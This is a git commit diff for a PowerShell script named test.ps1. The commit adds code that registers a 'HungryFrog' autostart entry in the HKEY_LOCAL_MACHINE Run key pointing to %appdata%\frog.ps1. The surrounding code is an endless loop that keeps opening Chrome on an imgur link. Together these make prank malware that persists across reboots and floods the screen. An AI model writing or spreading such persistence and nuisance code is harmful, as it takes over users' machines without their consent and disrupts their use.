9f6d0fb54e842492ceb690032985bdf2ce9af715
0utDoorFr0g <63755945+0utDoorFr0g@users.noreply.github.com>
2021-01-06 21:35:22 +0900

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,16 @@
-New-Item -Path "Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run" -name "HungryFrog" -Value "%appdata%\\frog.ps1";
+$registryPath = 'HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run'
+$name = 'HungryFrog'
+$value = '%appdata%\\frog.ps1'
 
+if(!(Test-Path $registryPath))
+{
+    New-Item -Path $registryPath -Force | Out-Null
+    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null 
+}
+else
+{
+    New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
+}
 while(1 -eq 1)
 {
   Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "https://imgur.com/RS2OVJf";
